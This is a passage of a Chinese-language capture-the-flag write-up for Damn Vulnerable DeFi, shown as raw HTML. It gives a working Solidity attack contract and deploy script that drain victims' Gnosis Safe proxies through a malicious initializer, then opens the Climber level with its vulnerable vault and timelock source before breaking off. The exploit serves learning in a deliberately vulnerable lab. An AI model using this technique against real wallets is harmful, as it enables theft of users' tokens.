class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-10\"><a href=\"#analyze-10\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>GnosisSafeProxyFactory合约通过deployProxyWithNonce创建GnosisSafeProxy，createProxyWithCallback函数会调用createProxyWithNonce函数，而且只要提供了有效的initalizer就会直接进行call调用。</p>\n<p>所以：</p>\n<p>创建带有approve功能的攻击合约，abi编码approve函数作为setup函数的data，abi编码setup函数作为createProxyWithCallback下的initializer。</p>\n<p>这样就做到了创建合约时进行了setup函数调用，同时回调了wallet合约下的proxyCreated函数，完成这些时，token已经被转到了proxy合约下，此时因为initializer的原因又调用了approve函数，进行了将proxy合约的token授权给攻击合约的操作，再transferfrom即可通关</p>\n<h2 id=\"attack-10\"><a href=\"#attack-10\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ProxyFactory</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">createProxyWithCallback</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> _singleton<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> initializer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> saltNonce<span class=\"token punctuation\">,</span>\n        IProxyCreationCallback callback\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span>GnosisSafeProxy proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IProxyCreationCallback</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">GnosisSafeProxy</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IERC20</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> token<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attackcontract</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> masterCopyAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> walletRegistryAddress<span class=\"token punctuation\">;</span>\n    ProxyFactory proxyFactory<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _proxyFactoryAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _walletRegistryAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _masterCopyAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        proxyFactory <span class=\"token operator\">=</span> <span class=\"token function\">ProxyFactory</span><span class=\"token punctuation\">(</span>_proxyFactoryAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        walletRegistryAddress <span class=\"token operator\">=</span> _walletRegistryAddress<span class=\"token punctuation\">;</span>\n        masterCopyAddress <span class=\"token operator\">=</span> _masterCopyAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> token<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> hacker<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> victims<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> victims<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">address</span> victim <span class=\"token operator\">=</span> victims<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> owners <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            owners<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> encodedApprove <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"approve(address,address)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> initializer <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setup(address[],uint256,address,bytes,address,address,uint256,address)\"</span><span class=\"token punctuation\">,</span>\n                owners<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> encodedApprove<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            GnosisSafeProxy proxy <span class=\"token operator\">=</span>\n            proxyFactory<span class=\"token punctuation\">.</span><span class=\"token function\">createProxyWithCallback</span><span class=\"token punctuation\">(</span>masterCopyAddress<span class=\"token punctuation\">,</span> initializer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">IProxyCreationCallback</span><span class=\"token punctuation\">(</span>walletRegistryAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hacker<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerContract  <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'attackcontract'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>walletFactory<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>walletRegistry<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>masterCopy<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"12-Climber\"><a href=\"#12-Climber\" class=\"headerlink\" title=\"12.Climber\"></a>12.Climber</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the <a href=\"https://eips.ethereum.org/EIPS/eip-1822\">UUPS pattern</a>.</p>\n<p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p>\n<p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p>\n<p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p>\n<p>Your goal is to empty the vault.</p></blockquote>\n<h2 id=\"ClimberVault-code\"><a href=\"#ClimberVault-code\" class=\"headerlink\" title=\"ClimberVault code\"></a><strong>ClimberVault</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./ClimberTimelock.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title ClimberVault\n * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ClimberVault</span> <span class=\"token keyword\">is</span> Initializable<span class=\"token punctuation\">,</span> OwnableUpgradeable<span class=\"token punctuation\">,</span> UUPSUpgradeable <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WITHDRAWAL_LIMIT <span class=\"token operator\">=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WAITING_PERIOD <span class=\"token operator\">=</span> <span class=\"token number\">15</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> _lastWithdrawalTimestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _sweeper<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlySweeper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> _sweeper<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Caller must be sweeper\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/// @custom:oz-upgrades-unsafe-allow constructor</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> initializer <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> admin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> proposer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> sweeper<span class=\"token punctuation\">)</span> initializer <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Initialize inheritance chain</span>\n        <span class=\"token function\">__Ownable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">__UUPSUpgradeable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Deploy timelock and transfer ownership to it</span>\n        <span class=\"token function\">transferOwnership</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClimberTimelock</span><span class=\"token punctuation\">(</span>admin<span class=\"token punctuation\">,</span> proposer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_setSweeper</span><span class=\"token punctuation\">(</span>sweeper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_setLastWithdrawal</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _lastWithdrawalTimestamp <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Allows the owner to send a limited amount of tokens to a recipient every now and then</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">&lt;=</span> WITHDRAWAL_LIMIT<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Withdrawing too much\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">></span> _lastWithdrawalTimestamp <span class=\"token operator\">+</span> WAITING_PERIOD<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Try later\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">_setLastWithdrawal</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        IERC20 token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Allows trusted sweeper account to retrieve any tokens</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlySweeper <span class=\"token punctuation\">&#123;</span>\n        IERC20 token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_sweeper<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getSweeper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _sweeper<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_setSweeper</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newSweeper<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        _sweeper <span class=\"token operator\">=</span> newSweeper<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getLastWithdrawalTimestamp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _lastWithdrawalTimestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_setLastWithdrawal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> timestamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        _lastWithdrawalTimestamp <span class=\"token operator\">=</span> timestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_authorizeUpgrade</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> onlyOwner override <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"ClimberTimelock-code\"><a href=\"#ClimberTimelock-code\" class=\"headerlink\" title=\"ClimberTimelock code\"></a><strong>ClimberTimelock</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/AccessControl.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title ClimberTimelock\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ClimberTimelock</span> <span class=\"token keyword\">is</span> AccessControl <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> ADMIN_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ADMIN_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> PROPOSER_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PROPOSER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Possible states for an operation in this timelock contract</span>\n    <span class=\"token keyword\">enum</span> <span class=\"token class-name\">OperationState</span> <span class=\"token punctuation\">&#123;</span>\n        Unknown<span class=\"token punctuation\">,</span>\n        Scheduled<span class=\"token punctuation\">,</span>\n        ReadyForExecution<span class=\"token punctuation\">,</span>\n        Executed\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Operation data tracked in this contract</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Operation</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint64</span> readyAtTimestamp<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// timestamp at which the operation will be ready for execution</span>\n        <span class=\"token builtin\">bool</span> known<span class=\"token punctuation\">;</span>         <span class=\"token comment\">// whether the operation is registered in the timelock</span>\n        <span class=\"token builtin\">bool</span> executed<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// whether the operation has been executed</span>\n    <span class=\"token 